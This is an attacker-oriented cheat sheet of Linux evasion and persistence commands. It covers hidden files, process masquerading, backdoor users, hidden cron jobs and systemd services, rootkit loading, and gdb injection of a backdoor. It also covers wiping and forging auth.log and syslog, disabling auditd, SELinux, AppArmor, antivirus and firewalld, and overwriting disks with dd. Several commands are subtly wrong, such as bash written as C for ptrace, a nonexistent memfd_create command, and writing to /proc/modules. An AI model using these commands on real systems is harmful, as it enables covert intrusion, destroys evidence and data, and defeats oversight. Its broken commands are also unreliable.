# File and Directory Obfuscation

#### Hiding Files and Directories
- **Creating hidden files and directories:** Prefixing file or directory names with a dot (`.`) hides them from normal `ls` listings.
	```bash
	mkdir /tmp/.hidden_dir
	touch /tmp/.hidden_file
	```
- **Using extended attributes to hide files (on systems with support):** Assigns a hidden attribute to a file using extended attributes.
	```bash
	setfattr -n user.hidden -v "1" <file>
	```
- **Create Files with Special Characters in Filenames:**
	```bash
	touch $'file\nname'
	```
- **Use Unicode Characters in Filenames for Obfuscation:**
	```bash
	touch "$(echo -e '\xE2\x80\x8E')malicious.sh"
	```

#### Hiding Files in Alternate Data Streams
- **Creates an alternate data stream (on supported filesystems):**
	```bash
	echo "malicious code" > file.txt:hidden
	```

#### Manipulating File Metadata
- **Change File Owner to Root to Avoid Deletion:**
	```bash
	sudo chown root:root /path/to/malicious_file
	```

#### File Attribute Modification
- **Using `chattr` to make files immutable:** Makes a file immutable, preventing it from being modified or deleted (useful for persistence files).
	```bash
	chattr +i <file>
	```
- **Remove immutable attribute:**
	```bash
	chattr -i <file>
	```

#### Modifying Timestamps (Timestomping)
- **Using `touch` to change file timestamps:** Modify the access and modification times of files to blend with existing files.
	```bash
	touch -d 'YYYY-MM-DD HH:MM:SS' <file>
	```
- **Timestomping Using `touch`:** Modifies Access Time
	```bash
	touch -a -m -t 202201010101.01 /path/to/file
	```
- **Timestomping Using `debugfs`:**
	```bash
	sudo debugfs -w /dev/sda1
	debugfs: set_inode_field <inode_number> atime "2022-01-01 12:34:56"
	debugfs: set_inode_field <inode_number> mtime "2022-01-01 12:34:56"
	```
- **Using `timestomp` tool (part of Metasploit):** Modify the metadata (MACE) of a file (for NTFS file systems).
	```bash
	timestomp <file> -m <timestamp>
	```

#### Using Polymorphic and Metamorphic Techniques
- **Create Polymorphic Shell Scripts:**
	```bash
	while true; do
	  sed -i 's/placeholder/$(uuidgen)/g' /path/to/malicious_script.sh
	  sleep 600
	done &
	```
- **Dynamically Change Script Content to Avoid Detection:**
	```bash
	while true; do
	  echo "Changing script content for evasion"
	  sed -i 's/old_content/new_content/g' /path/to/malicious_script.sh
	  sleep 600
	done &
	```

#### Evasion via Binary Padding and Encryption
- **Pad Binaries to Change Hashes:**
	```bash
	dd if=/dev/urandom bs=1 count=1024 >> /path/to/malicious_binary
	```
- **Encrypt Malicious Binaries with `openssl`:**
	```bash
	openssl enc -aes-256-cbc -in /path/to/malicious_binary -out /path/to/encrypted_binary
	```

#### Using EncFS for Encrypted Directories
- **Create an Encrypted Directory with EncFS:**
	```bash
	encfs /path/to/encrypted /path/to/decrypted
	```
- **Unmount Encrypted Directory:**
	```bash
	fusermount -u /path/to/decrypted
	```

#### Steganography Techniques
- **Hide Data Within an Image File:**
	```bash
	steghide embed -cf cover.jpg -ef secret.txt
	```
- **Extract Hidden Data from an Image:**
	```bash
	steghide extract -sf cover.jpg
	```
- **Hide Data Within an Audio File:**
	```bash
	steghide embed -cf cover.wav -ef secret.txt
	```
- **Extract Hidden Data from an Audio File:**
	```bash
	steghide extract -sf cover.wav
	```
- **Hide Data Within a Video File:**
	```bash
	ffmpeg -i video.mp4 -i secret.txt -c copy -map 0:0 -map 1:0 -disposition:v:0 attached_pic output.mp4
	```

# Process Hiding and Obfuscation

#### Using `unshare` to create a new PID namespace
- **Starts a new shell in a new PID namespace:**
	```bash
	unshare -f --pid --mount-proc /bin/bash
	```

#### Hiding or Spoofing Process Names
- **Using `exec` to replace process names:** Changes the name of the running process to `fake_process_name` when viewed in `ps` or `top`.
	```bash
	exec -a "fake_process_name" /bin/bash
	```
- **Spoof process in `/proc`:** Creates a symlink to `/proc/self/fd`, potentially confusing defenders during inspection.
	```bash
	ln -s /proc/self/fd /tmp/fake_proc
	```

#### Masquerading with Legitimate Process Names
- **Rename Malicious Binaries to System Daemon Names:**
	```bash
	mv /path/to/malicious_binary /usr/bin/cron
	/usr/bin/cron -f
	```
- **Spoof Process Names in `ps` Output:**
	```bash
	echo "12345:apache2" > /proc/12345/comm
	```

#### Using Legitimate Paths for Malicious Files
- **Hide Malicious Scripts in System Folders:**
	```bash
	mv /path/to/malicious_script.sh /usr/local/bin/cron
	chmod +x /usr/local/bin/cron
	```

#### Running in Background (Daemonizing)
- **Use `nohup` to avoid termination on logout:** Runs a process in the background, ignoring `HUP` (hangup) signals, meaning the process won’t terminate if the terminal is closed.
	```bash
	nohup <command> & disown
	```
- **Disowning a background process:** Removes a job from the shell's job table, making it not traceable via terminal job controls.
	```bash
	disown -h %<job_id>
	```

#### Process Priority Manipulation
- **Renicing processes to reduce visibility:** Reduces the process priority to the lowest level (making it less likely to show up in resource-heavy scans).
	```bash
	renice +19 <pid>
	```

#### Process Injection & Code Injections
- **Inject malicious code into legitimate processes:** Tools like `ptrace`, `LD_PRELOAD`, or `gdb` can inject code into existing processes to evade detection.
	```bash
	gdb -p <pid> -ex "call system(\"/bin/bash /tmp/backdoor.sh\")" -ex "detach" -ex "quit"
	```
- **Hiding processes with `libprocesshider`:**
	- Use the `libprocesshider` library to hide malicious processes from system commands like `ps` or `top`.
- **DLL Injection (For Wine or Cygwin Environments):**
	```bash
	wine inject.exe /path/to/malicious.dll
	```

#### Process Hijacking
- **LD_PRELOAD Library Hijacking:** Use the `LD_PRELOAD` environment variable to inject malicious shared libraries into system processes.
    ```bash
    export LD_PRELOAD=/tmp/malicious.so
    ```
- **Hijack a Legitimate Process Using LD_PRELOAD:**
	```bash
	LD_PRELOAD=/path/to/malicious.so /bin/ls
	```

#### Memory Evasion Techniques
- **Use `memfd_create` for in-memory payload execution:** Execute payloads purely in memory using `memfd_create` to avoid writing to disk. This technique is effective at evading file-based detection.
    ```bash
    memfd_create <payload>
    ```

# User and Identity Evasion

#### Creating or Modifying User Accounts
- **Create a low-privilege user account:** Creates a new user with a specific shell and group.
	```bash
	useradd -m -s /bin/bash -G <group> <username>
	```
- **Adding a backdoor user without showing in `/etc/passwd`:**
	- Manually add user entries in `/etc/passwd`, `/etc/shadow`, and `/etc/group` with the required attributes, then change file permissions to restrict visibility.

#### Creating a Hidden User
- **Adds a system user with no home and no login shell:**
	```bash
	useradd -M -s /bin/false -r hidden_user
	```

#### Modifying Existing User Permissions
- **Adds the target user to the sudo group:**
	```bash
	usermod -aG sudo <target_user>
	```

#### Disabling or deleting user logs/history
- **Disable User History:** Prevents the history file from logging shell commands for the current session.
	```bash
	export HISTFILE=/dev/null
	```

# Scheduled Task Evasion

#### Hidden Cron Jobs
- **Creating Hidden Cron Jobs:** Create a cron job for a less visible user account (e.g., `nobody` or a new low-privileged account).
	```bash
	echo "* * * * * nobody /bin/bash /tmp/.hidden_backdoor.sh" >> /etc/crontab
	```
- **Hiding cron jobs using non-standard directories:** Place cron jobs in rarely inspected directories, like `/var/spool/cron/crontabs/`.
    ```bash
    echo "@reboot /bin/bash /tmp/.hidden.sh" >> /var/spool/cron/crontabs/root
    ```

#### Job Scheduler and Timer Manipulation
- **Create `systemd` timers for stealthy execution:** Timers can run jobs at specified intervals and are less commonly inspected compared to cron.
    ```bash
    [Unit]
    Description=Malicious Timer Task

    [Timer]
    OnBootSec=5min
    OnUnitActiveSec=10min

    [Install]
    WantedBy=timers.target
    ```
- **Install the timer:**
	```bash
	systemctl enable <malicious_timer>.timer
	```

#### Disabling Logging in Cron Jobs
- **Disabling Logging in Cron Jobs:**
	```bash
	@reboot /path/to/malicious_script > /dev/null 2>&1
	```

# Service and Execution Evasion

#### Masquerading as Legitimate Services
- **Rename backdoor binaries to legitimate service names:** Renames a backdoor binary to resemble a legitimate service.
	```bash
	cp /tmp/backdoor /usr/local/bin/sshd_fake
	```
- **Modify service scripts to run malicious binaries:** Edit `/etc/systemd/system/<service_name>.service` to include backdoor execution commands.

#### Systemd Masking & Obfuscation
- **Mask legitimate services with malicious ones:** Mask a legitimate service to prevent it from being started, then run a malicious binary in its place.
	```bash
	systemctl mask <service_name>
	```
	- **Example:**
		```bash
		systemctl mask sshd
		ln -s /bin/bash /etc/systemd/system/sshd.service
		systemctl start sshd
		```
- **Create hidden `systemd` service:** Obfuscate a backdoor service by placing it in a less suspicious location:
    ```bash
    [Unit]
    Description=Backup Daemon Service

    [Service]
    ExecStart=/usr/local/bin/.hidden_backdoor.sh

    [Install]
    WantedBy=multi-user.target
    ```
	- Place the file in `/lib/systemd/system/backup.service`, then enable it:
		```bash
		systemctl enable backup.service
		```

# Tampering with Security Tools and Logs

#### Deleting or Altering Log Files and History
- **Log clearing:** Clears authentication logs and syslog events.
    ```bash
    echo "" > /var/log/auth.log
    echo "" > /var/log/syslog
    ```
- **Shredding logs to make recovery difficult:** Overwrites and deletes log files, making recovery very difficult.
	```bash
	shred -u /var/log/auth.log
	```
- **Clear bash history or redirect it to `/dev/null`:** Prevent commands from being logged in the history file.
    ```bash
    export HISTFILE=/dev/null
    history -c
    ```
- **Use `sed` to remove specific entries from log files:** Delete specific log entries without clearing the entire log.
    ```bash
    sed -i '/pattern_to_remove/d' /var/log/auth.log
    ```
- **Removing entries from `~/.bash_history`:** Deletes specific entries from the history.
	```bash
	history -d <line_number>
	```
- **Disabling command history altogether:** Disables logging of commands for the current session.
	```bash
	unset HISTFILE
	```
- **Redirects stdout and stderr to null:**
	```bash
	exec 1>/dev/null 2>/dev/null
	```

- **Modify log rotation and retention policies:** Modify `/etc/logrotate.conf` to reduce log retention or overwrite logs more frequently.

#### Modifying or Disabling Auditing Systems
- **Disable Linux Auditing (`auditd`):** Temporarily stop auditd to prevent security event logging:
    ```bash
    systemctl stop auditd
    systemctl disable auditd
    ```
- **Manipulate audit rules to bypass detection:** Modify `/etc/audit/audit.rules` to exclude certain processes or files from being audited.
    ```bash
    -a never,exit -F arch=b64 -S execve -k exclude_execve
    ```

#### Disabling or Evading SELinux and AppArmor
- **Set SELinux to permissive mode:** Temporarily reduce the enforcement level of SELinux:
    ```bash
    setenforce 0
    sed -i 's/SELINUX=enforcing/SELINUX=permissive/' /etc/selinux/config
    ```
- **Disable AppArmor:**
	```bash
	sudo systemctl stop apparmor
	```
- **Bypassing AppArmor restrictions:** Use a tool like `aa-unconfined` to list unconfined processes, or modify AppArmor profiles in `/etc/apparmor.d/` to reduce restrictions:
    ```bash
    aa-complain /etc/apparmor.d/usr.bin.your_app
    ```

#### Disable or uninstall anti-virus software
- **Temporarily disable anti-virus processes:**
	```bash
	systemctl stop <antivirus_service>
	```
- **Permanently remove AV tools (potentially detectable, but effective):**
	```bash
	apt remove <antivirus_package>
	```

#### Stop and Disable `firewalld`
- **Stop and Disable `firewalld`:**
	```bash
	sudo systemctl stop firewalld
	sudo systemctl disable firewalld
	```

# Manipulating Kernel and System Calls

#### Hiding Kernel Modules
- **Use `rmmod` to Remove a Kernel Module:**
	```bash
	sudo rmmod <module_name>
	```
- **Hide a Kernel Module from `lsmod`:**
	```bash
	echo "module_name" > /proc/modules
	```

#### Loading Malicious Kernel Modules
- **Load a Malicious Kernel Module with Custom Syscalls:**
	```bash
	sudo insmod /path/to/malicious_module.ko
	```
- **Remove Kernel Module Artifacts After Execution:**
	```bash
	sudo rmmod malicious_module
	sudo rm /path/to/malicious_module.ko
	```

#### Hooking System Calls
- **Hooks system calls using a shared object library:**
	```bash
	LD_PRELOAD=/path/to/hook.so /bin/bash
	```

#### Using Kernel-Level Rootkits
- **Install a Kernel-Level Rootkit for Stealth:**
	```bash
	sudo insmod /path/to/rootkit.ko
	echo "hide PID" > /proc/rootkit
	```
- **Remove Evidence of Rootkit Installation:**
	```bash
	sudo rmmod rootkit
	sudo rm /path/to/rootkit.ko
	```

# Bypassing Detection

#### Disabling History Logging Temporarily
- **Prevents the current session from being logged:**
	```bash
	unset HISTFILE
	```
- **Ignores all commands from being saved in history:**
	```bash
	export HISTIGNORE='*'
	```

# Anti-Forensics and Data Destruction

#### Anti-Forensics and File Carving Prevention
- **Use `shred` to securely delete files:** Overwrite files multiple times before deletion to prevent recovery.
    ```bash
    shred -n 5 -u /tmp/malicious_file
    ```

#### Secure File Deletion Techniques
- **Securely Wipe Disk Blocks:**
	```bash
	sudo dd if=/dev/zero of=/dev/sdX bs=1M
	```
- **Overwrite and Wipe Free Space:**
	```bash
	sudo dd if=/dev/zero of=/path/to/largefile
	rm /path/to/largefile
	```
- **Using `dd` to wipe disk sectors:** Overwrite disk sectors to prevent forensic recovery.
    ```bash
    dd if=/dev/zero of=/dev/sda bs=1M count=100
    ```

#### Wiping Specific Logs
- **Clears authentication logs:**
	```bash
	cat /dev/null > /var/log/auth.log
	```
- **Clears syslog:**
	```bash
	cat /dev/null > /var/log/syslog
	```

#### Removing Logs Completely
- **Deletes the authentication log file:**
	```bash
	rm -rf /var/log/auth.log
	```
- **Deletes the syslog file:**
	```bash
	rm -rf /var/log/syslog
	```

#### Clearing `bash` History
- **Clears the current shell history:**
	```bash
	history -c
	```
- **Deletes the bash history file:**
	```bash
	rm -f ~/.bash_history
	```

#### Backdating Log Entries
- **Change Timestamps of Log Files:**
	```bash
	touch -t 202201010101 /var/log/auth.log
	```
- **Modify Logs to Appear Older Using `sed`:**
	```bash
	sed -i 's/2022-05-01/2022-01-01/g' /var/log/syslog
	```

#### Automating Log Cleansing
- **Create a Script to Regularly Clean Logs:**
	```bash
	echo 'find /var/log -type f -exec sh -c "cat /dev/null > {}" \;' > /etc/cron.daily/clean_logs
	chmod +x /etc/cron.daily/clean_logs
	```

#### Disk Encryption for Data Hiding
- **Encrypt Disk Partitions Using LUKS:**
	```bash
	sudo cryptsetup luksFormat /dev/sdX
	sudo cryptsetup luksOpen /dev/sdX encrypted_partition
	```

#### Advanced Data Wiping
- **Securely Wipe a Disk Using `shred`:**
	```bash
	sudo shred -n 35 -vz /dev/sdX
	```

#### Encrypting Data Before Destruction
- **Encrypt Sensitive Data Before Wiping:**
	```bash
	openssl enc -aes-256-cbc -in /path/to/sensitive_data -out /path/to/encrypted_data
	shred -u /path/to/encrypted_data
	```

# Anti-Debugging and Anti-Reversing Techniques

#### Using `ptrace` to Detect Debuggers
- **Detect Debuggers Using `ptrace`:**
	```bash
	if ptrace(PTRACE_TRACEME, 0, 1, 0) < 0; then exit; fi
	```

#### Obfuscating Execution Flow
- **Use Control Flow Obfuscation in Scripts:**
	```bash
	while [ 1 ]; do
	  if [ $RANDOM -lt 10000 ]; then break; fi
	done
	```

# Sandbox, Honeypot, and Virtualization Evasion

#### Evading Detection in Sandbox Environments
- **Detect Sandbox Indicators and Exit:**
	```bash
	if grep -q 'sandbox' /proc/self/status; then exit; fi
	```
- **Delay Execution to Bypass Sandboxes:**
	```bash
	sleep 1200; /path/to/malicious_script.sh
	```

#### Avoiding Honeypot Detection
- **Check for Low Interaction Honeypots:**
	```bash
	curl http://<ip_address>:<port> -I | grep "Server:"
	```
- **Avoid Common Honeypot Ports:**
	```bash
	nmap -p <port_range> -Pn <target_ip>
	```

#### Detecting Virtualization and Exiting
- **Check for Virtualization Artifacts and Exit:**
	```bash
	if grep -q 'hypervisor' /proc/cpuinfo; then exit; fi
	```

#### Honeypot Evasion Techniques
- **Detect Honeypot by Checking Common Services:**
	```bash
	nmap -p 22,80,443 <target_ip> --script=banner-plus
	```
- **Avoid Interacting with Known Honeypot IP Ranges:**
	```bash
	ip route add blackhole <honeypot_ip_range>
	```
